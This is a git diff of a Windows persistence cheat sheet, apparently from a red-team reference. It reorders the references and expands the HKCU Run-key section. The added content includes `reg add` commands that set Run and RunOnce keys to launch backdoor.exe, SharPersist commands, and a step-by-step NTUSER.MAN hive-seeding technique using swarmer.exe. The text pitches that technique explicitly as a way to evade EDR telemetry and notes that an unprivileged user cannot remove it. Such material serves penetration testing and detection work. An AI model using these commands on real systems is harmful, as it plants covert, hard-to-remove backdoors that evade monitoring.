@@ -152,29 +152,74 @@ attrib +h c:\autoexec.bat
 
 ### Registry HKCU
 
-Create a REG_SZ value in the Run key within HKCU\Software\Microsoft\Windows.
+Create a `REG_SZ` value in the `Run` key within `HKCU\Software\Microsoft\Windows`.
 
 ```powershell
 Value name:  Backdoor
 Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
 ```
 
-Using the command line
+* Using the command line
+
+    ```powershell
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+    ```
+
+* Using [mandiant/SharPersist](https://github.com/mandiant/SharPersist)
+
+    ```powershell
+    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
+    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
+    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
+    ```
+
+#### Persistence via NTUSER.MAN
+
+Directly modifying `HKCU` for persistence (e.g., `Run` keys) is noisy and commonly detected by modern EDR solutions. A lesser-known alternative is to pre-seed the user’s registry hive offline by abusing `NTUSER.MAN`, which Windows treats as a mandatory profile.
+
+When a user logs in, Windows loads their registry hive from disk. If an `NTUSER.MAN` file is present instead of (or alongside) `NTUSER.DAT`, Windows loads the hive as read-only and applies its contents verbatim—without generating the usual registry modification telemetry.
+
+Instead of editing the live registry:
+
+1. Export the target user’s `HKCU` hive
+
+   * Via `reg export HKCU exported.reg`
+   * Using a BOF-based approach to avoid spawning `reg.exe`.
+
+2. Modify the exported registry data offline
+
+   * Add or change persistence mechanisms (e.g., `Run` keys).
+
+3. Convert the modified `.reg` file into a binary hive
+
+   * Use [praetorian-inc/swarmer](https://github.com/praetorian-inc/swarmer) to generate a valid `NTUSER.MAN`.
+
+4. Drop the resulting `NTUSER.MAN` into the user’s profile directory
+
+   * `%USERPROFILE%\NTUSER.MAN`
+
+Example:
 
 ```powershell
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+swarmer.exe --startup-key "Updater" --startup-value "C:\Path\To\payload.exe" exported.reg NTUSER.MAN
 ```
 
-Using SharPersist
+On the next logon, Windows loads this hive automatically, establishing persistence without touching the live registry.
 
-```powershell
-SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
-SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
-SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
-```
+**Mandatory profile side effects**
+Creating an `NTUSER.MAN` converts the user profile into a mandatory profile. Any registry or profile changes made during the session are discarded at logoff and will not persist across logins.
+
+**Immutability without elevation**
+Once deployed, the hive is effectively immutable. Modifying or removing the persistence requires deleting `NTUSER.MAN`, which typically necessitates administrative privileges.
+
+**Login-time loading only**
+The hive is loaded exclusively during user logon. Changes to `NTUSER.MAN` have no effect until the user fully logs out and logs back in.
+
+**Limited scope**
+This technique applies only to the user registry hive (HKCU). It does not impact machine-wide settings (HKLM) and provides per-user persistence only.
 
 ### Startup
 
@@ -648,18 +693,19 @@ Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"
 
 ## References
 
-* [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
-* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
-* [IIS Raid – Backdooring IIS Using Native Modules - 19/02/2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
-* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
-* [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
-* [Persistence – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)
+* [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - wunderwuzzi - September 23, 2020](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
+* [Corrupting the Hive Mind: Persistence Through Forgotten Windows Internals - Michael Weber - January 26, 2026](https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/)
+* [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
+* [Hijack the TypeLib. New COM persistence technique - CICADA8 - October 22, 2024](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+* [IIS Raid – Backdooring IIS Using Native Modules - February 19, 2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
+* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - @phraaaaaaa - April 27, 2020](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
 * [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
+* [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
 * [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
 * [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
-* [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
-* [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
+* [Persistence – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)
 * [Persistence via WMI Event Subscription - Elastic Security Solution](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)
-* [PrivEsc: Abusing the Service Control Manager for Stealthy & Persistent LPE - 0xv1n - 2023-02-27](https://0xv1n.github.io/posts/scmanager/)
-* [Sc sdset - Microsoft - 08/31/2016](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742037(v=ws.11))
-* [Hijack the TypeLib. New COM persistence technique - CICADA8 - October 22, 2024](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+* [PrivEsc: Abusing the Service Control Manager for Stealthy & Persistent LPE - 0xv1n - February 27, 2023](https://0xv1n.github.io/posts/scmanager/)
+* [Sc sdset - Microsoft - August 31, 2016](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742037(v=ws.11))
+* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins - September 8, 2019](http://www.youtube.com/watch?v=K7o9RSVyazo)
+* [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
